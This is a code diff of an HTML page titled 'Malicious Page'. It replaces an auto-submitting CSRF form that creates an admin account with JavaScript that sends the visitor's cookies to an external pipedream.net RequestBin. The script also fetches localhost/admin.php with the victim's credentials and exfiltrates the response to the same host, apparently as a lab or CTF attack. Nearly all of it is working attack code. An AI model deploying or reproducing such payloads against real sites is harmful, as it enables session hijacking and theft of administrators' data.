@@ -1,12 +1,24 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <form id="adminForm" action="http://localhost/addadmin.php" method="POST">
-      <input type="hidden" name="username" value="asdf" />
-      <input type="hidden" name="password" value="asdf" />
-      <input type="submit" value="Submit request" />
-    </form>
+<head>
+    <title>Malicious Page</title>
     <script>
-      document.getElementById("adminForm").submit();
+        // Send the admin's cookies to your RequestBin
+        fetch('https://eoneud0rqkb43vu.m.pipedream.net?cookie=' + document.cookie);
+        
+        // Perform a CSRF attack to retrieve sensitive data
+        fetch('http://localhost/admin.php', {
+            method: 'GET',
+            credentials: 'include'
+        })
+        .then(response => response.text())
+        .then(data => {
+            // Send the data to your RequestBin
+            fetch('https://eoneud0rqkb43vu.m.pipedream.net`?data=' + encodeURIComponent(data));
+        });
     </script>
-  </body>
+</head>
+<body>
+    <h1>Loading...</h1>
+</body>
 </html>
